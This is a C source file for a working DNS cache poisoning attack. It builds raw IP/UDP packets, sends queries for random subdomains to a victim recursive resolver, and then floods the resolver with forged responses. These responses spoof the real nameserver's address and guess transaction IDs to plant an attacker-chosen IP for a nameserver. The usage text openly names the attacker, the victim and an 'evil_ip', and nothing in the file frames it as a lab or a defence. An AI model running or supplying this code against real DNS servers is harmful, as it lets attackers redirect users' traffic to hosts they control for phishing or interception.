#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <time.h>
#include <stdint.h> // For uint16_t, uint32_t

#define PCKT_LEN 8192
#define FLAG_R 0x8400 // Response flag
#define FLAG_Q 0x0100 // Query flag

// IP header's structure
struct ipheader
{
    unsigned char iph_ihl : 4, iph_ver : 4;
    unsigned char iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned short int iph_offset;
    unsigned char iph_ttl;
    unsigned char iph_protocol;
    unsigned short int iph_chksum;
    unsigned int iph_sourceip;
    unsigned int iph_destip;
};

// UDP header's structure
struct udpheader
{
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;
};

// DNS header's structure
struct dnsheader
{
    unsigned short int query_id;
    unsigned short int flags;
    unsigned short int QDCOUNT;
    unsigned short int ANCOUNT;
    unsigned short int NSCOUNT;
    unsigned short int ARCOUNT;
};

// Structure for the data part of a DNS query
struct dataEnd
{
    unsigned short int type;
    unsigned short int class;
};

#pragma pack(push, 1)
// Fixed-size data for a resource record (excluding variable-length name and rdata)
struct R_DATA
{
    unsigned short type;
    unsigned short class;
    uint32_t ttl;
    unsigned short rdlength;
};
#pragma pack(pop)

// Checksum function
unsigned short csum(unsigned short *buf, int nwords)
{
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

/**
 * @brief Converts a standard hostname (e.g., "www.google.com") into DNS label format
 * (e.g., "\3www\6google\3com\0").
 * @param dns_name_out Buffer to store the formatted name.
 * @param hostname_in The input hostname string.
 */
void dns_format_name(unsigned char *dns_name_out, const char *hostname_in)
{
    char hostname[256];
    strncpy(hostname, hostname_in, 255);
    hostname[255] = '\0'; // Ensure null termination
    strcat(hostname, ".");

    int lock = 0;
    for (int i = 0; i < strlen(hostname); i++)
    {
        if (hostname[i] == '.')
        {
            *dns_name_out++ = i - lock;
            for (; lock < i; lock++)
            {
                *dns_name_out++ = hostname[lock];
            }
            lock++;
        }
    }
    *dns_name_out++ = '\0';
}

// Writes a DNS question section to the buffer
unsigned int write_question(void *buffer, unsigned char *formatted_query)
{
    int query_len = strlen((const char *)formatted_query) + 1;
    memcpy(buffer, formatted_query, query_len);

    struct dataEnd *end = (struct dataEnd *)(buffer + query_len);
    end->type = htons(1);  // Type A
    end->class = htons(1); // Class IN

    return query_len + sizeof(struct dataEnd);
}

// Writes an A-type DNS answer section
unsigned int write_answer(void *buffer, unsigned char *formatted_query, char *ip_answer)
{
    int query_len = strlen((const char *)formatted_query) + 1;
    memcpy(buffer, formatted_query, query_len);

    struct R_DATA *rdata = (struct R_DATA *)(buffer + query_len);
    rdata->type = htons(1);     // Type A
    rdata->class = htons(1);    // Class IN
    rdata->ttl = htonl(259200); // TTL (e.g., 3 days)
    rdata->rdlength = htons(4); // Length of an IPv4 address

    char *rdata_payload = (char *)(rdata + 1);
    inet_pton(AF_INET, ip_answer, rdata_payload);

    return query_len + sizeof(struct R_DATA) + 4;
}

// Writes an NS-type DNS authoritative section
unsigned int write_authoritative_answer(void *buffer, unsigned char *formatted_domain, unsigned char *formatted_ns_name)
{
    int domain_len = strlen((const char *)formatted_domain) + 1;
    memcpy(buffer, formatted_domain, domain_len);

    struct R_DATA *rdata = (struct R_DATA *)(buffer + domain_len);
    rdata->type = htons(2);     // Type NS
    rdata->class = htons(1);    // Class IN
    rdata->ttl = htonl(259200); // TTL

    int ns_name_len = strlen((const char *)formatted_ns_name) + 1;
    rdata->rdlength = htons(ns_name_len);

    char *rdata_payload = (char *)(rdata + 1);
    memcpy(rdata_payload, formatted_ns_name, ns_name_len);

    return domain_len + sizeof(struct R_DATA) + ns_name_len;
}

// Generates a DNS query packet
unsigned int generate_dns_question(
    char *src_ip,
    char *dst_ip,
    unsigned char *formatted_query,
    char *dst_buffer)
{
    char *buffer = dst_buffer;
    struct ipheader *ip = (struct ipheader *)buffer;
    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *dns = (struct dnsheader *)(buffer + sizeof(struct ipheader) + sizeof(struct udpheader));
    unsigned char *data = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));

    // IP Header
    ip->iph_ver = 4;
    ip->iph_ihl = 5;
    ip->iph_tos = 0;
    ip->iph_ident = htons(rand());
    ip->iph_offset = 0;
    ip->iph_ttl = 64;
    ip->iph_protocol = IPPROTO_UDP;
    ip->iph_sourceip = inet_addr(src_ip);
    ip->iph_destip = inet_addr(dst_ip);
    ip->iph_chksum = 0; // Will be computed later

    // UDP Header
    udp->udph_srcport = htons(rand() % 15000 + 40000); // Random source port
    udp->udph_destport = htons(53);
    udp->udph_chksum = 0; // Checksum is optional for IPv4 UDP

    // DNS Header
    dns->query_id = htons(rand());
    dns->flags = htons(FLAG_Q);
    dns->QDCOUNT = htons(1);
    dns->ANCOUNT = 0;
    dns->NSCOUNT = 0;
    dns->ARCOUNT = 0;

    // DNS Question
    unsigned int question_len = write_question(data, formatted_query);

    unsigned int dns_payload_len = sizeof(struct dnsheader) + question_len;
    udp->udph_len = htons(sizeof(struct udpheader) + dns_payload_len);

    unsigned int packet_len = sizeof(struct ipheader) + sizeof(struct udpheader) + dns_payload_len;
    ip->iph_len = htons(packet_len);
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader));

    return packet_len;
}

// Generates a forged DNS response packet
unsigned int generate_dns_answer(
    char *src_ip_spoof, // The IP of the server we are impersonating
    char *dst_ip,       // The IP of the victim DNS server
    unsigned char *formatted_query,
    unsigned char *formatted_ns_domain,
    char *evil_ip,
    char *dst_buffer,
    unsigned short **txid_ptr,
    int victim_port) // The crucial victim source port
{
    char *buffer = dst_buffer;
    struct ipheader *ip = (struct ipheader *)buffer;
    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *dns = (struct dnsheader *)(buffer + sizeof(struct ipheader) + sizeof(struct udpheader));
    unsigned char *data = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));

    // IP Header
    ip->iph_ver = 4;
    ip->iph_ihl = 5;
    ip->iph_tos = 0;
    ip->iph_ident = htons(rand());
    ip->iph_offset = 0;
    ip->iph_ttl = 64;
    ip->iph_protocol = IPPROTO_UDP;
    ip->iph_sourceip = inet_addr(src_ip_spoof); // Spoof the source IP!
    ip->iph_destip = inet_addr(dst_ip);
    ip->iph_chksum = 0; // Will be computed later

    // UDP Header -- THIS IS THE CRITICAL FIX
    udp->udph_srcport = htons(53);           // Response comes FROM port 53
    udp->udph_destport = htons(victim_port); // Response goes TO victim's query port
    udp->udph_chksum = 0;                    // Optional for IPv4

    // DNS Header
    dns->query_id = 0;            // Start TXID guessing from 0
    *txid_ptr = &(dns->query_id); // Give caller a pointer to the TXID field
    dns->flags = htons(FLAG_R);
    dns->QDCOUNT = htons(1);
    dns->ANCOUNT = htons(1);
    dns->NSCOUNT = htons(1);
    dns->ARCOUNT = 0;

    // Pointer to keep track of where to write next
    void *last_byte = data;

    // Question Section
    unsigned int question_len = write_question(last_byte, formatted_query);
    last_byte += question_len;

    // Answer Section: Poisoning the NS record to point to our evil IP
    unsigned int answer_len = write_answer(last_byte, formatted_ns_domain, evil_ip);
    last_byte += answer_len;

    // Authoritative Section: Listing the (poisoned) NS record
    char domain_to_delegate[] = "example.com"; // The domain being delegated
    unsigned char formatted_base_domain[256];
    dns_format_name(formatted_base_domain, domain_to_delegate);
    unsigned int auth_len = write_authoritative_answer(last_byte, formatted_base_domain, formatted_ns_domain);

    // Calculate final lengths
    unsigned int dns_payload_len = question_len + answer_len + auth_len + sizeof(struct dnsheader);
    udp->udph_len = htons(sizeof(struct udpheader) + dns_payload_len);
    unsigned int packet_len = sizeof(struct ipheader) + sizeof(struct udpheader) + dns_payload_len;
    ip->iph_len = htons(packet_len);
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader));

    return packet_len;
}

int main(int argc, char **argv)
{
    if (argc != 9)
    {
        printf("[-] Usage: %s <src_ip> <dst_ip> <target_ns_domain> <target_ns_ip> <evil_ip> <query_count> <guess_count> <victim_port>\n", argv[0]);
        printf("\n\t[1] src_ip: Attacker's real IP (for initial query)\n");
        printf("\t[2] dst_ip: Victim recursive DNS server IP\n");
        printf("\t[3] target_ns_domain: Nameserver to poison (e.g., ns.example.com)\n");
        printf("\t[4] target_ns_ip: Real IP of the nameserver (to impersonate)\n");
        printf("\t[5] evil_ip: IP to inject into victim's cache\n");
        printf("\t[6] query_count: Number of unique subdomains to query\n");
        printf("\t[7] guess_count: Number of TXID guesses per query (max 65535)\n");
        printf("\t[8] victim_port: The source port the victim uses for its queries\n\n");
        exit(-1);
    }

    const char *src_ip = argv[1];
    const char *dst_ip = argv[2];
    const char *target_domain_nameserver = argv[3];
    const char *target_domain_nameserver_ip = argv[4];
    const char *evil_ip = argv[5];
    const int query_count = atoi(argv[6]);
    const int guesses = atoi(argv[7]);
    const int victim_port = atoi(argv[8]);

    printf("[+] Attacker starting...\n");
    printf("  > Victim Server: %s\n", dst_ip);
    printf("  > Nameserver to poison: %s (IP: %s)\n", target_domain_nameserver, target_domain_nameserver_ip);
    printf("  > Injection Target IP: %s\n", evil_ip);
    printf("  > Victim's Query Port: %d\n", victim_port);

    int sd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sd < 0)
    {
        perror("[-] Socket creation failed");
        return 1;
    }

    int one = 1;
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
    {
        perror("[-] setsockopt(IP_HDRINCL) failed");
        close(sd);
        return 1;
    }

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(53);
    sin.sin_addr.s_addr = inet_addr(dst_ip);

    srand(time(0));

    // Prepare the formatted nameserver domain once
    unsigned char formatted_ns_domain[256];
    dns_format_name(formatted_ns_domain, target_domain_nameserver);

    // Main attack loop
    for (int i = 0; i < query_count; i++)
    {
        char buffer[PCKT_LEN];

        // 1. Create and send a unique query to trigger the victim
        char query_hostname[256];
        sprintf(query_hostname, "%04d-attack.example.com", i); // Create a unique, non-cached domain
        unsigned char formatted_query[256];
        dns_format_name(formatted_query, query_hostname);

        memset(buffer, 0, PCKT_LEN);
        unsigned int question_packet_len = generate_dns_question(src_ip, dst_ip, formatted_query, buffer);

        printf("\n[%d/%d] Sending query for %s...\n", i + 1, query_count, query_hostname);
        if (sendto(sd, buffer, question_packet_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
        {
            fprintf(stderr, "[-] Query packet send error: %s\n", strerror(errno));
            continue;
        }

        // 2. Flood the victim with forged responses
        unsigned short *txid_ptr;
        memset(buffer, 0, PCKT_LEN);
        unsigned int answer_packet_len = generate_dns_answer(
            (char *)target_domain_nameserver_ip, (char *)dst_ip,
            formatted_query, formatted_ns_domain, (char *)evil_ip,
            buffer, &txid_ptr, victim_port);

        printf("  -> Flooding with %d guesses...", guesses);
        fflush(stdout);
        for (int j = 0; j < guesses; j++)
        {
            // The TXID is incremented in network byte order
            *txid_ptr = htons(ntohs(*txid_ptr) + 1);
            if (sendto(sd, buffer, answer_packet_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            {
                // Don't print for every packet to avoid spamming console
                if (j == guesses - 1)
                    fprintf(stderr, "\n[-] Flood packet send error: %s\n", strerror(errno));
            }
        }
        printf(" Done.\n");
        usleep(10000); // Small delay between queries
    }

    printf("\n[+] Attack finished.\n");
    close(sd);
    return 0;
}